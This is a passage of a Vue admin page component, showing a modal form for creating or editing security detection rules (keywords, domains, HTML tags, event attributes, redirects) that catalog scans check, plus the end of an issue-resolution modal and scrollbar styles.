              class="flex-1 sm:flex-none h-9 px-4 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold transition-colors shadow-xs"
            >
              Resolve Issue
            </button>
          </div>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: ADD / EDIT DETECTION RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isRuleModalOpen"
      :title="editingRule ? `Edit Rule: ${editingRule.id}` : 'Create Security Detection Rule'"
      subtitle="Define pattern heuristics for automated catalog inspection."
      max-width="max-w-lg"
      @close="isRuleModalOpen = false"
    >
      <form @submit.prevent="saveRule" class="p-6 space-y-4">
        <!-- Rule Type -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Rule Type</label>
          <select 
            v-model="ruleForm.type"
            :disabled="!!editingRule"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          >
            <option value="keyword">Blacklisted Keyword / Phrase</option>
            <option value="domain">Malicious / Phishing Domain</option>
            <option value="html">Dangerous HTML Tag</option>
            <option value="attribute">Dangerous Event Attribute</option>
            <option value="redirect">Redirect Hijacking Rule</option>
          </select>
        </div>

        <!-- Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Token String <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="ruleForm.pattern"
            type="text" 
            placeholder="e.g. casino-example.com, <script>, onclick, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category</label>
            <input 
              v-model="ruleForm.category"
              type="text" 
              placeholder="e.g. Phishing, Spam, XSS"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
            />
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity</label>
            <select 
              v-model="ruleForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20"
            >
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="ruleForm.description"
            rows="2"
            placeholder="Explain why this token is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are checked during catalog scans</p>
          </div>
          <input 
            v-model="ruleForm.enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="isRuleModalOpen = false"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs"
          >
            {{ editingRule ? 'Save Changes' : 'Create Rule' }}
          </button>
        </div>
      </form>
    </UiAdminModal>
  </div>
</template>

<style scoped>
.custom-scrollbar::-webkit-scrollbar {
  height: 4px;
}
.custom-scrollbar::-webkit-scrollbar-track {
  background: transparent;
}
.custom-scrollbar::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.2);
  border-radius: 10px;
}
.custom-scrollbar:hover::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.4);
}
</style>
